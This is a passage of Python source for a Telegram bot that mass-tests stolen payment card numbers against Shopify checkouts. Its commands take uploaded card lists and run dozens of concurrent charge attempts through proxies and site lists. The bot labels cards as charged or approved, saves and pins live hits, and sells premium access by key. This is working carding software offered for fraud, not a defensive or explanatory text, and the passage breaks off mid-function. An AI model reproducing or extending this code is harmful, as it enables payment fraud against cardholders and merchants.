                        should_send_message = False
                    else:
                        await save_approved_card(user_id, username, card, "Approved", result.get('Response'), result.get('Gate'), result.get('Price'))
                elif "captcha_required" in response_text:
                    declined += 1
                    display_response = "CARD_DECLINED"
                else:
                    declined += 1

                active_data["hits"] = charged + approved

                sender = await event.get_sender()
                user_name = sender.first_name or "Unknown"
                price = result.get('Price', '0')

                status_icon = "💰" if is_charged else "❌"
                status_title = "𝘾𝙃𝘼𝙍𝙂𝙀𝘿" if is_charged else "𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿"
                if status_text == "maxed out":
                    status_icon = "⚠️"
                    status_title = "𝙍𝙚𝙩𝙧𝙮 𝙈𝙖𝙭𝙚𝙙 𝙊𝙪𝙩"
                elif "cloudflare bypass failed" in response_text:
                    status_icon = "⚠️"
                    status_title = "𝘾𝙇𝙊𝙐𝘿𝙁𝙇𝘼𝙍𝙀 𝙎𝙋𝙊𝙏𝙏𝙀𝘿"
                elif any(key in response_text for key in ["3ds_required", "3ds_authentication", "otp_required", "invalid_cvv", "incorrect_cvv", "insufficient_funds", "approved", "success", "invalid_cvc", "incorrect_cvc", "incorrect_zip", "insufficient funds"]):
                    status_icon = "✅"
                    status_title = "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿"

                card_msg = create_premium_gate_layout(
                    status_icon, status_title, card, display_response, "Shopify",
                    brand, bin_type, level, bank, country, flag, user_id, user_name, elapsed_time,
                    price=price
                )
                if should_send_message:
                    gif_url = get_gate_gif("Shopify")
                    result_msg = await event.reply(premium_emoji(card_msg, mode="md"), file=await _safe_gif(gif_url))
                    if is_charged:
                        await pin_charged_message(event, result_msg)

                if checked == total or (time.time() - last_ui_update) > 3:
                    last_ui_update = time.time()
                    _bar_size = 10
                    _filled = int(_bar_size * checked / total) if total else 0
                    progress_bar = f"[{'█' * _filled}{'░' * (_bar_size - _filled)}]"
                    percentage = int(100 * checked / total) if total else 0
                    last_card_truncated = f"{last_card[:20]}..." if len(last_card) > 20 else last_card
                    last_response_clean = f"{last_res[:50]}..." if len(last_res) > 50 else last_res
                    progress_text = (
                        f"{premium_emoji('💎')} <b>Shopify Cooking</b>\n\n"
                        f"{premium_emoji('🎱')} <b>Batch ID:</b> {batch_id}\n"
                        f"{progress_bar} {percentage}%\n"
                        f"{premium_emoji('🔄')} <b>Checked:</b> {checked}/{total}\n"
                        f"{premium_emoji('🔥')} <b>Approved:</b> {approved}\n"
                        f"{premium_emoji('💰')} <b>Charged:</b> {charged}\n"
                        f"{premium_emoji('❌')} <b>Declined:</b> {declined}\n\n"
                        f"<b>𝗟𝗮𝘀𝘁:</b> <code>{last_card_truncated}</code>\n"
                        f"<b>Ｒ𝗲𝘀:</b> {last_response_clean}"
                    )
                    buttons = build_mass_progress_buttons(
                        "charging", approved, charged, declined, checked, total,
                        f"stop_msh:{user_id}".encode()
                    )
                    try:
                        await status_msg.edit(progress_text, buttons=buttons, parse_mode="html")
                    except:
                        pass

                await asyncio.sleep(0.1)
    finally:
        RUNNING_TASKS.pop(user_id, None)
        ACTIVE_PROCESSES.pop(user_id, None)

    try:
        await status_msg.edit(premium_emoji(f"```✅ 𝙈𝙖𝙨𝙨 𝘾𝙝𝙚𝙘𝙠 𝘾𝙤𝙢𝙥𝙡𝙚𝙩𝙚! 𝙋𝙧𝙤𝙘𝙚𝙨𝙨𝙚𝙙 {checked}/{total} 𝙘𝙖𝙧𝙙𝙨.```", mode="md"))
    except:
        pass

@client.on(events.NewMessage(pattern=r'(?i)^[/.]mtxt$'))
async def mtxt(event):
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned": return await event.reply(banned_user_message())
    await enforce_gate_access(event)
    
    user_id = event.sender_id
    
    # --- ADJUSTMENT: Check for actual running task object ---
    if user_id in RUNNING_TASKS: 
        return await event.reply(premium_emoji("```❌ 𝙔𝙤𝙪 𝙖𝙡𝙧𝙚𝙖𝙙𝙮 𝙝𝙖𝙫𝙚 𝙖 𝙥𝙧𝙤𝙘𝙚𝙨𝙨 𝙧𝙪𝙣𝙣𝙞𝙣𝙜! 𝙎𝙩𝙤𝙥 𝙞𝙩 𝙛𝙞𝙧𝙨𝙩.```", mode="md"))
    
    try:
        if not event.reply_to_msg_id: return await event.reply(premium_emoji("```𝙋𝙡𝙚𝙖𝙨𝙚 𝙧𝙚𝙥𝙡𝙮 𝙩𝙤 𝙖 𝙙𝙤𝙘𝙪𝙢𝙚𝙣𝙩 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙬𝙞𝙩𝙝 /𝙢𝙩𝙭𝙩```"))
        replied_msg = await event.get_reply_message()
        if not replied_msg or not replied_msg.document: return await event.reply(premium_emoji("```𝙋𝙡𝙚𝙖𝙨𝙚 𝙧𝙚𝙥𝙡𝙮 𝙩𝙤 𝙖 𝙙𝙤𝙘𝙪𝙢𝙚𝙣𝙩 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙬𝙞𝙩𝙝 /𝙢𝙩𝙭𝙩```"))
        
        file_path = await replied_msg.download_media()
        try:
            async with aiofiles.open(file_path, "r", encoding="utf-8", errors="ignore") as f: lines = (await f.read()).splitlines()
            os.remove(file_path)
        except Exception as e:
            try: os.remove(file_path)
            except: pass
            return await event.reply(premium_emoji(f"❌ 𝙀𝙧𝙧𝙤𝙧 𝙧𝙚𝙖𝙙𝙞𝙣𝙜 𝙛𝙞𝙡𝙚: {e}", mode="md"))
        
        cards = [line for line in lines if re.match(r'\d{12,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}', line)]
        if not cards: return await event.reply(premium_emoji("```𝘼𝙣𝙮 𝙑𝙖𝙡𝙞𝙙 𝘾𝘾 𝙣𝙤𝙩 𝙁𝙤𝙪𝙣𝙙 💎```", mode="md"))
        
        cc_limit = get_cc_limit(access_type, user_id)
        total_cards_found = len(cards)
        
        if len(cards) > cc_limit:
            cards = cards[:cc_limit]
            await event.reply(premium_emoji(f"""📝 𝙁𝙤𝙪𝙣𝙙 {total_cards_found} 𝘾𝘾𝙨 𝙞𝙣 𝙛𝙞𝙡𝙚
⚠️ 𝙋𝙧𝙤𝙘𝙚𝙨𝙨𝙞𝙣𝙜 𝙤𝙣𝙡𝙮 𝙛𝙞𝙧𝙨𝙩 {cc_limit} 𝘾𝘾𝙨 (𝙮𝙤𝙪𝙧 𝙡𝙞𝙢𝙞𝙩)
🔥 {len(cards)} 𝘾𝘾𝙨 𝙬𝙞𝙡𝙡 𝙗𝙚 𝙘𝙝𝙚𝙘𝙠𝙚𝙙"""), parse_mode='html')
        else: 
            await event.reply(premium_emoji(f"""📝 𝙁𝙤𝙪𝙣𝙙 {total_cards_found} 𝙫𝙖𝙡𝙞𝙙 𝘾𝘾𝙨 𝙞𝙣 𝙛𝙞𝙡𝙚
🔥 𝘼𝙡𝙡 {len(cards)} 𝘾𝘾𝙨 𝙬𝙞𝙡𝙡 𝙗𝙚 𝙘𝙝𝙚𝙘𝙠𝙚𝙙"""), parse_mode='html')
        
        sites = await load_json(SITE_FILE)
        user_sites = sites.get(str(event.sender_id), [])
        if not user_sites: return await event.reply(premium_emoji("```𝙎𝙞𝙩𝙚 𝙉𝙤𝙩 𝙁𝙤𝙪𝙣𝙙 𝙄𝙣 𝙔𝙤𝙪𝙧 𝘿𝙗```"))

        # Register tracking data for /active cmd
        sender = await event.get_sender()
        name = sender.first_name or "User"
        ACTIVE_PROCESSES[user_id] = {
            "name": name, 
            "checked": 0, 
            "total": len(cards), 
            "hits": 0, 
            "start_time": time.time()
        }

        # Create Task and store in RUNNING_TASKS to allow full kills
        task, batch_id = start_batch_task(user_id, process_mtxt_cards(event, cards, user_sites.copy()), "mtxt")
        RUNNING_TASKS[user_id] = task

    except Exception as e:
        ACTIVE_PROCESSES.pop(user_id, None)
        RUNNING_TASKS.pop(user_id, None)
        await event.reply(premium_emoji(f"❌ 𝙀𝙧𝙧𝙤𝙧: {e}", mode="md"))

async def process_mtxt_cards(event, cards, local_sites):
    try:
        sender = await event.get_sender()
        user_name_alias = sender.first_name or "Unknown"
    except:
        user_name_alias = "Unknown"
    
    user_id = event.sender_id
    batch_id = USER_BATCHES.get(user_id, "N/A")
    
    # Tracking Data
    if user_id not in ACTIVE_PROCESSES:
        ACTIVE_PROCESSES[user_id] = {"name": user_name_alias, "checked": 0, "total": len(cards), "hits": 0, "start_time": time.time()}
    
    data = ACTIVE_PROCESSES[user_id]
    total = len(cards)
    checked, approved, charged, declined = 0, 0, 0, 0
    results_for_report = [] 
    maxed_out_cards = []
    error_cards = []
    site_charge_counters = {}
    bug_sites_flagged = set()
    removed_bug_sites = []
    bug_site_lock = asyncio.Lock()
    
    status_msg = await event.reply(premium_emoji(f"💎 <b>Something Big Cooking</b>\n\🎱 <b>Batch ID:</b> <code>{batch_id}</code>"), parse_mode='html')
    
    last_ui_update = 0 
    current_site_index = 0
    semaphore = asyncio.Semaphore(50)

    # Variables for UI Panel
    last_card = "N/A"
    last_res = "N/A"
    last_site_idx = "N/A"
    all_tasks = []

    async def track_bug_site_charge(charged_site):
        site_key = site_dedupe_key(charged_site)
        if not site_key:
            return
        async with bug_site_lock:
            site_charge_counters[site_key] = site_charge_counters.get(site_key, 0) + 1
            if site_charge_counters[site_key] < BUG_SITE_CHARGE_THRESHOLD:
                return
            if site_key in bug_sites_flagged:
                return
            bug_sites_flagged.add(site_key)
            local_sites[:] = [s for s in local_sites if site_dedupe_key(s) != site_key]
            removed = await remove_bug_site_from_database(user_id, charged_site)
            display_site = get_site_url(charged_site) or site_key
            if removed:
                removed_bug_sites.append(display_site)
            log_info(
                "[BUG-SITE]",
                f"Auto-removed bug site {site_key} after {BUG_SITE_CHARGE_THRESHOLD}+ charges in batch {batch_id} (user {user_id})"
            )
            try:
                await client.send_message(
                    user_id,
                    premium_emoji(
                        f"⚠️ <b>Bug site auto-removed</b>\n\n"
                        f"<code>{display_site}</code> hit {BUG_SITE_CHARGE_THRESHOLD}+ charges in this batch and was removed from your site database."
                    ),
                    parse_mode='html'
                )
            except Exception:
                pass

    async def throttled_check(card, site, u_id):
        # Check if user stopped before starting
        if u_id not in RUNNING_TASKS: return None
        async with semaphore:
            if u_id not in RUNNING_TASKS: return None
            start_time = time.time()
            res = await check_card_specific_site(card, site, u_id, should_log=True, all_sites=local_sites)
            elapsed_time = round(time.time() - start_time, 2)
            actual_site = res.get("Site") if isinstance(res, dict) else None
            if not actual_site:
                actual_site = get_site_url(site)
            return res, card, actual_site, elapsed_time

    try:
        if not local_sites:
            await status_msg.edit(premium_emoji("❌ **All your sites are dead!**", mode="md"))
            return

        all_tasks = [asyncio.create_task(throttled_check(c, local_sites[i % len(local_sites)], user_id)) for i, c in enumerate(cards)]

        for completed_task in asyncio.as_completed(all_tasks):
            try:
                result, card, site_used, elapsed_time = await completed_task
            except asyncio.CancelledError:
                break 

            # HARD KILL SWITCH
            if user_id not in RUNNING_TASKS:
                break

            if result is None: continue 

            checked += 1
            data['checked'] = checked
            
            res_text = result.get("Response", "Error")
            safe_res_text = report_safe_response(result)
            public_res_text = public_final_response(result)
            res_lower = res_text.lower()
            status_lower = result.get("Status", "").lower()
            gate = result.get("Gate", "Shopify")
            price = result.get("Price", "-")
            
            # Update UI placeholders
            last_card = card
            last_res = public_res_text
            try: last_site_idx = local_sites.index(site_used) + 1
            except: last_site_idx = "💎"

            is_hit = False
            hit_label = "DECLINED"

            if is_maxed_out_result(result):
                declined += 1
                hit_label = "MAXED OUT"
                maxed_out_cards.append(card)
            elif is_error_result(result):
                declined += 1
                hit_label = "ERROR"
                error_cards.append(card)
            elif not is_shopify_working(res_text):
                declined += 1
            elif is_3ds_required_response(res_text):
                approved += 1
                hit_label = "APPROVED"
                data['hits'] = (charged + approved)
            elif "captcha_required" in res_lower:
                declined += 1
                hit_label = "DECLINED"
                safe_res_text = "CARD_DECLINED"
            elif any(key in res_lower for key in ["3d", "verify"]) or ("otp" in res_lower and "otp_required" not in res_lower):
                declined += 1
            else:
                brand, bin_type, level, bank, country, flag = await get_bin_info(card.split("|")[0])

                charged_keywords = ["charged", "order_paid", "order completed", "order_placed", "thank you", "successful", "💎"]
                
                if any(k in res_lower for k in charged_keywords) or any(k in status_lower for k in charged_keywords):
                    charged += 1
                    hit_label = "CHARGED"
                    await save_approved_card(user_id, user_name_alias, card, "CHARGED", res_text, gate, price)
                    is_hit = True
                    st_header = "𝘾𝙃𝘼𝙍𝙂𝙀𝘿 💰"
                    await track_bug_site_charge(result.get("Site") or site_used)
                elif "otp_required" in res_lower:
                    approved += 1
                    hit_label = "APPROVED"
                    data['hits'] = (charged + approved)
                elif any(k in res_lower for k in ["3ds_required", "invalid_cvv", "approved", "success", "insufficient funds"]):
                    approved += 1
                    hit_label = "APPROVED"
                    if not is_3ds_required_response(res_text):
                        await save_approved_card(user_id, user_name_alias, card, "APPROVED", res_text, gate, price)
                        is_hit = True
                    st_header = "𝘼𝙋𝙋𝙍𝙊𝑑𝙀𝘿 ✅"
                else:
                    declined += 1
                
                if is_hit:
                    data['hits'] = (charged + approved)
                    brand, bin_type, level, bank, country, flag = map(safe_bin_value, [brand, bin_type, level, bank, country, flag])
                    # Extract sender info for the profile link
                    sender = await event.get_sender()
                    user_name = sender.first_name or "Unknown"
                    user_id = event.sender_id

                    # Setup status indicators cleanly
                    status_icon = "💰" if hit_label == "CHARGED" else "✅" if hit_label == "APPROVED" else "❌"
                    status_title = "𝘾𝙃𝘼𝙍𝙂𝙀𝘿" if hit_label == "CHARGED" else "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿" if hit_label == "APPROVED" else "𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿"

                    # Premium MTXT Layout
                    card_msg = create_premium_gate_layout(
                        status_icon, status_title, card, public_res_text, "Shopify",
                        brand, bin_type, level, bank, country, flag, user_id, user_name, elapsed_time,
                        price=price
                    )
                    try:
                        gif_url = get_gate_gif("Shopify")
                        m = await event.reply(premium_emoji(card_msg, mode="md"), file=await _safe_gif(gif_url))
                        if hit_label == "CHARGED": await pin_charged_message(event, m)
                    except: pass

            results_for_report.append(f"{card} | {hit_label} | {safe_res_text} | {gate} | {price}")

            if checked == total or (time.time() - last_ui_update) > 4:
                last_ui_update = time.time()
                _bar_size = 10
                _filled = int(_bar_size * checked / total) if total else 0
                progress_bar = f"[{'█' * _filled}{'░' * (_bar_size - _filled)}]"
                percentage = int(100 * checked / total) if total else 0
                last_card_truncated = f"{last_card[:20]}..." if len(last_card) > 20 else last_card
                last_response_clean = f"{last_res[:50]}..." if len(last_res) > 50 else last_res
                progress_text = (
                    f"{premium_emoji('💎')} <b>Shopify Cooking</b>\n\n"
                    f"{premium_emoji('🎱')} <b>Batch ID:</b> {batch_id}\n"
                    f"{progress_bar} {percentage}%\n"
                    f"{premium_emoji('📊')} <b>Checked:</b> {checked}/{total}\n"
                    f"{premium_emoji('🔥')} <b>Approved:</b> {approved}\n"
                    f"{premium_emoji('💰')} <b>Charged:</b> {charged}\n"
                    f"{premium_emoji('❌')} <b>Declined:</b> {declined}\n\n"
                    f"<b>𝗟𝗮𝘀𝘁:</b> <code>{last_card_truncated}</code>\n"
                    f"<b>Ｒ𝗲𝘀:</b> {last_response_clean}"
                )
                buttons = build_mass_progress_buttons(
                    "charging", approved, charged, declined, checked, total,
                    f"stop_mtxt:{user_id}".encode()
                )
                try: await status_msg.edit(progress_text, buttons=buttons, parse_mode="html")
                except: pass

    except Exception as e:
        log_error("MTXT_ENGINE", f"Crash: {str(e)}")
    finally:
        pending_card_tasks = [task for task in all_tasks if not task.done()]
        if pending_card_tasks:
            for task in pending_card_tasks:
                task.cancel()
            await asyncio.gather(*pending_card_tasks, return_exceptions=True)

        # --- SEND REPORT REGARDLESS OF STOP OR FINISH ---
        if checked > 0:
            report_stream = io.BytesIO()
            report_data = f"📊 MTXT REPORT | Checked: {checked}/{total}\n"
            report_data += f"Status: {'COMPLETED' if checked == total else 'STOPPED'}\n"
            report_data += "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            report_data += "\n".join(results_for_report)
            report_stream.write(report_data.encode('utf-8'))
            report_stream.seek(0)
            report_stream.name = "MTXT_Results.txt"

            status_txt = "✅ <b>Finished!</b>" if checked == total else "🛑 <b>Stopped!</b>"
            caption_text = f"{status_txt}\n\n💎 Charged: {charged}\n🔥 Approved: {approved}\n📊 Scanned: {checked}/{total}"
            if removed_bug_sites:
                caption_text += (
                    f"\n\n⚠️ <b>Bug sites removed:</b>\n" +
                    "\n".join(f"• <code>{site}</code>" for site in removed_bug_sites)
                )
            caption = premium_emoji(caption_text)
            try:
                await status_msg.delete()
                await event.respond(caption, file=report_stream, parse_mode='html')
                if maxed_out_cards:
                    await event.respond(file=make_text_file_stream("Maxed_Out_CCs.txt", "maxed out cc's", maxed_out_cards))
                if error_cards:
                    await event.respond(file=make_text_file_stream("Error_CCs.txt", "error cc's", error_cards))
            except:
                await event.respond(caption, file=report_stream, parse_mode='html')
                if maxed_out_cards:
                    await event.respond(file=make_text_file_stream("Maxed_Out_CCs.txt", "maxed out cc's", maxed_out_cards))
                if error_cards:
                    await event.respond(file=make_text_file_stream("Error_CCs.txt", "error cc's", error_cards))

        ACTIVE_PROCESSES.pop(user_id, None)
        RUNNING_TASKS.pop(user_id, None)

@client.on(events.NewMessage(pattern=r'(?i)^[/.]buy$'))
async def buy_cmd(event):
    if await is_banned_user(event.sender_id):
        return await event.reply(banned_user_message())
    text, _ = get_buy_panel_text()
    await event.reply(text, parse_mode='html', link_preview=False)


@client.on(events.NewMessage(pattern='/stats'))
async def stats(event):
    if not is_owner(event.sender_id):
        return

    try:
        premium_users = await load_json(PREMIUM_FILE)
        free_users = await load_json(FREE_FILE)
        user_sites = await load_json(SITE_FILE)
        keys_data = await load_json(KEYS_FILE)

        user_hits_data, id_to_name_map, hit_entries, global_approved, global_charged = await parse_cc_log()
        global_total = len(hit_entries)

        # --- BUILDING THE REPORT ---
        now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        report = "🔥 BOT STATISTICS REPORT 🔥\n"
        report += "=" * 50 + "\n\n"
        report += f"💎 Generated on: {now}\n\n"

        # 1. USER STATISTICS
        report += "💎 USER STATISTICS\n" + "-" * 30 + "\n"
        all_ids = set(premium_users.keys()) | set(free_users.keys())
        report += f"📊 Total Unique Users: {len(all_ids)}\n"
        report += f"💎 Premium Users: {len(premium_users)}\n"
        report += f"🆓 Free Users: {len(free_users)}\n\n"

        # 2. PREMIUM USERS DETAILS
        report += "💎 PREMIUM USERS DETAILS\n" + "-" * 30 + "\n"
        for uid, data in premium_users.items():
            expiry_date = datetime.datetime.fromisoformat(data['expiry'])
            remaining = (expiry_date - datetime.datetime.now()).days
            u_stat = user_hits_data.get(uid, {"approved": 0, "charged": 0})
            name = id_to_name_map.get(uid, "Unknown")
            
            report += f"User ID: {uid} ({name})\n"
            report += f"  Status: {'ACTIVE' if remaining > 0 else 'EXPIRED'}\n"
            report += f"  Days Given: {data.get('days', 'N/A')}\n"
            report += f"  Added By: {data.get('added_by', 'admin')}\n"
            report += f"  Expires: {expiry_date.strftime('%Y-%m-%d %H:%M:%S')}\n"
            report += f"  Days Remaining: {max(0, remaining)}\n"
            report += f"  ✅ Approved Cards: {u_stat['approved']}\n"
            report += f"  💎 Charged Cards: {u_stat['charged']}\n"
            report += "-" * 20 + "\n"
        report += "\n"

        # 3. TOP USER HITS
        report += "💎 TOP USER HITS (By Name)\n" + "-" * 30 + "\n"
        if user_hits_data:
            sorted_top = sorted(user_hits_data.items(), key=lambda x: x[1]['total'], reverse=True)
            for uid, stats in sorted_top[:10]:
                name = id_to_name_map.get(uid, "Unknown")
                report += f"💎 {name} (`{uid}`): {stats['total']} Hits\n"
        else:
            report += "No hits recorded yet.\n"
        report += "\n"

        # 4. SITES STATISTICS
        report += "🌐 SITES STATISTICS\n" + "-" * 30 + "\n"
        total_sites = sum(len(sites) for sites in user_sites.values())
        report += f"💎 Total Sites Added: {total_sites}\n"
        report += f"💎 Users with Sites: {len([u for u in user_sites if user_sites[u]])}\n\n"
        report += "Sites per User:\n"
        for uid, sites in user_sites.items():
            if sites:
                name = id_to_name_map.get(uid, "Unknown")
                report += f"  User {uid} ({name}): {len(sites)} sites\n"
        report += "\n"

        # 5. KEYS STATISTICS
        report += "💎 KEYS STATISTICS\n" + "-" * 30 + "\n"
        used_keys = [k for k, v in keys_data.items() if v.get('used')]
        report += f"💎 Total Keys Generated: {len(keys_data)}\n"
        report += f"✅ Used Keys: {len(used_keys)}\n"
        report += f"⏳ Unused Keys: {len(keys_data) - len(used_keys)}\n\n"
        report += "Keys Details:\n"
        for key, kd in keys_data.items():
            report += f"  Key: {key}\n"
            report += f"    Status: {'USED' if kd.get('used') else 'UNUSED'}\n"
            report += f"    Days Value: {kd.get('days')}\n"
            report += f"    Created: {kd.get('created_at')}\n"
            report += "---------------" + "\n"
        report += "\n"

        # 6. ADMIN STATISTICS
        report += "💎 ADMIN STATISTICS\n" + "-" * 30 + "\n"
        report += f"💎 Total Admins: {len(ADMIN_ID)}\n"
        adm_names = []
        for aid in ADMIN_ID:
            adm_names.append(f"{aid} ({id_to_name_map.get(str(aid), 'Admin')})")
        report += f"Admin IDs: {', '.join(adm_names)}\n\n"

        # 7. CARD STATISTICS (Global)
        report += "💳 CARD STATISTICS\n" + "-" * 30 + "\n"
        report += f"📊 Total Processed Cards: {global_total}\n"
        report += f"✅ Approved Cards: {global_approved}\n"
        report += f"💎 Charged Cards: {global_charged}\n\n"

        report += "=" * 50 + "\n"
        report += "📋 END OF REPORT 📋"

        filename = f"Report_{int(time.time())}.txt"
        async with aiofiles.open(filename, "w", encoding="utf-8") as f:
            await f.write(report)
        
        await event.reply(premium_emoji("📊 **Statistical report generated!**", mode="md"), file=filename)
        os.remove(filename)

    except Exception as e:
        await event.reply(premium_emoji(f"❌ **Error:** {str(e)}", mode="md"))

@client.on(events.NewMessage(pattern=r'(?i)^[/.]ran$'))
async def ranfor(event):
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned": return await event.reply(banned_user_message())
    if not can_access:
        buttons = [[Button.url("𝙐𝙨𝙚 𝙄𝙣 𝙂𝙧𝙤𝙪𝙥 𝙁𝙧𝙚𝙚", f"https://t.me/+0EgyvdopAvszODQ8")]]
        return await event.reply(premium_emoji("🚫 𝙐𝙣𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙨𝙚𝙙 𝘼𝙘𝙘𝙚𝙨𝙨!\n\n𝙔𝙤𝙪 𝙘𝙖𝙣 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙗𝙤𝙩 𝙞𝙣 𝙜𝙧𝙤𝙪𝙥 𝙛𝙤𝙧 𝙛𝙧𝙚𝙚!\n\n𝙁𝙤𝙧 𝙥𝙧𝙞𝙫𝙖𝙩𝙚 𝙖𝙘𝙘𝙚𝙨𝙨, 𝙘𝙤𝙣𝙩𝙖𝙘𝙩 @𝙈𝙧 𝘽𝙖𝙙 𝙂𝙪𝙮", mode="md"), buttons=buttons)
    
    # Check if user has added proxy
    proxy_data = await get_user_proxy(event.sender_id)
    if not proxy_data:
        return await event.reply(premium_emoji("⚠️ 𝙋𝙧𝙤𝙭𝙮 𝙍𝙚𝙦𝙪𝙞𝙧𝙚𝙙!\n\n𝙋𝙡𝙚𝙖𝙨𝙚 𝙖𝙙𝙙 𝙖 𝙥𝙧𝙤𝙭𝙮 𝙛𝙞𝙧𝙨𝙩 𝙪𝙨𝙞𝙣𝙜:\n`/addpxy ip:port:username:password`\n\n𝙊𝙧 𝙬𝙞𝙩𝙝𝙤𝙪𝙩 𝙖𝙪𝙩𝙝:\n`/addpxy ip:port`", mode="md"))
    
    user_id = event.sender_id
    if user_id in ACTIVE_MTXT_PROCESSES: return await event.reply(premium_emoji("```𝙔𝙤𝙪𝙧 𝘾𝘾 is 𝙖𝙡𝙧𝙚𝙖𝙙𝙮 𝘾𝙤𝙤𝙠𝙞𝙣𝙜 💎 𝙬𝙖𝙞𝙩 𝙛𝙤𝙧 𝙘𝙤𝙢𝙥𝙡𝙚𝙩𝙚```", mode="md"))
    try:
        if not event.reply_to_msg_id: return await event.reply(premium_emoji("```𝙋𝙡𝙚𝙖𝙨𝙚 𝙧𝙚𝙥𝙡𝙮 𝙩𝙤 𝙖 𝙙𝙤𝙘𝙪𝙢𝙚𝙣𝙩 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙬𝙞𝙩𝙝 /𝙧𝙖𝙣```"))
        replied_msg = await event.get_reply_message()
        if not replied_msg or not replied_msg.document: return await event.reply(premium_emoji("```𝙋𝙡𝙚𝙖𝙨𝙚 𝙧𝙚𝙥𝙡𝙮 𝙩𝙤 𝙖 𝙙𝙤𝙘𝙪𝙢𝙚𝙣𝙩 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙬𝙞𝙩𝙝 /𝙧𝙖𝙣```"))
        
        # Load sites from sites.txt
        if not os.path.exists('sites.txt'):
            return await event.reply(premium_emoji("❌ 𝙎𝙞𝙩𝙚𝙨 𝙛𝙞𝙡𝙚 𝙣𝙤𝙩 𝙛𝙤𝙪𝙣𝙙! 𝘾𝙤𝙣𝙩𝙖𝙘𝙩 𝙖𝙙𝙢𝙞𝙣.", mode="md"))
        
        async with aiofiles.open('sites.txt', 'r', encoding="utf-8", errors="ignore") as f:
            sites_content = await f.read()
            global_sites = [line.strip() for line in sites_content.splitlines() if line.strip()]
        
        if not global_sites:
            return await event.reply(premium_emoji("❌ 𝙉𝙤 𝙨𝙞𝙩𝙚𝙨 𝙖𝙫𝙖𝙞𝙡𝙖𝙗𝙡𝙚 𝙞𝙣 𝙨𝙞𝙩𝙚𝙨.𝙩𝙭𝙩! 𝘾𝙤𝙣𝙩𝙖𝙘𝙩 𝙖𝙙𝙢𝙞𝙣.", mode="md"))
        
        file_path = await replied_msg.download_media()
        try:
            async with aiofiles.open(file_path, "r", encoding="utf-8", errors="ignore") as f: lines = (await f.read()).splitlines()
            os.remove(file_path)
        except Exception as e:
            try: os.remove(file_path)
            except: pass
            return await event.reply(premium_emoji(f"❌ 𝙀𝙧𝙧𝙤𝙧 𝙧𝙚𝙖𝙙𝙞𝙣𝙜 𝙛𝙞𝙡𝙚: {e}", mode="md"))
        cards = [line for line in lines if re.match(r'\d{12,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}', line)]
        if not cards: return await event.reply(premium_emoji("𝘼𝙣𝙮 𝙑𝙖𝙡𝙞𝙙 𝘾𝘾 𝙣𝙤𝙩 𝙁𝙤𝙪𝙣𝙙 💎", mode="md"))
        cc_limit = get_cc_limit(access_type, user_id)
        total_cards_found = len(cards)
        if len(cards) > cc_limit:
            cards = cards[:cc_limit]
            await event.reply(premium_emoji(f"""📝 𝙁𝙤𝙪𝙣𝙙 {total_cards_found} 𝘾𝘾𝙨 𝙞𝙣 𝙛𝙞𝙡𝙚
⚠️ 𝙋𝙧𝙤𝙘𝙚𝙨𝙨𝙞𝙣𝙜 𝙤𝙣𝙡𝙮 𝙛𝙞𝙧𝙨𝙩 {cc_limit} 𝘾𝘾𝙨 (𝙮𝙤𝙪𝙧 𝙡𝙞𝙢𝙞𝙩)
🔥 {len(cards)} 𝘾𝘾𝙨 𝙬𝙞𝙡𝙡 𝙗𝙚 𝙘𝙝𝙚𝙘𝙠𝙚𝙙"""), parse_mode='html')
        else: await event.reply(premium_emoji(f"""📝 𝙁𝙤𝙪𝙣𝙙 {total_cards_found} 𝙫𝙖𝙡𝙞𝙙 𝘾𝘾𝙨 𝙞𝙣 𝙛𝙞𝙡𝙚
🔥 𝘼𝙡𝙡 {len(cards)} 𝘾𝘾𝙨 𝙬𝙞𝙡𝙡 𝙗𝙚 𝙘𝙝𝙚𝙘𝙠𝙚𝙙"""), parse_mode='html')
        
        ACTIVE_MTXT_PROCESSES[user_id] = True
        task, batch_id = start_batch_task(user_id, process_ranfor_cards(event, cards, global_sites.copy()), "ran")
        RUNNING_TASKS[user_id] = task
    except Exception as e:
        ACTIVE_MTXT_PROCESSES.pop(user_id, None)
        await event.reply(premium_emoji(f"❌ 𝙀𝙧𝙧𝙤𝙧: {e}", mode="md"))

async def process_ranfor_cards(event, cards, global_sites):
    # Get username
    try:
        sender = await event.get_sender()
        username = sender.username if sender.username else f"user_{event.sender_id}"
    except:
        username = f"user_{event.sender_id}"
    
    user_id = event.sender_id
    total = len(cards)
    checked, approved, charged, declined = 0, 0, 0, 0
    last_ui_update = 0
    last_card = "N/A"
    last_res = "N/A"
    batch_id = USER_BATCHES.get(user_id, "N/A")
    ACTIVE_PROCESSES[user_id] = {"name": username, "checked": 0, "total": total, "hits": 0, "start_time": time.time()}
    status_msg = await event.reply(premium_emoji(f"```𝙎𝙤మె𝙩𝙝𝙞𝙣𝙜 𝘽𝙞𝙜 𝘾𝙤𝙤𝙠𝙞𝙣𝙜 💎```", mode="md"))

    def _ranfor_panel_buttons():
        return build_mass_progress_buttons(
            "charging", approved, charged, declined, checked, total,
            f"stop_ranfor:{user_id}".encode()
        )

    async def _update_ranfor_panel(force=False):
        nonlocal last_ui_update
        if force or checked == total or (time.time() - last_ui_update) > 4:
            last_ui_update = time.time()
            _bar_size = 10
            _filled = int(_bar_size * checked / total) if total else 0
            progress_bar = f"[{'█' * _filled}{'░' * (_bar_size - _filled)}]"
            percentage = int(100 * checked / total) if total else 0
            last_card_truncated = f"{last_card[:20]}..." if len(last_card) > 20 else last_card
            last_response_clean = f"{last_res[:50]}..." if len(last_res) > 50 else last_res
            progress_text = (
                f"{premium_emoji('💎')} <b>Shopify Cooking</b>\n\n"
                f"{premium_emoji('🎱')} <b>Batch ID:</b> {batch_id}\n"
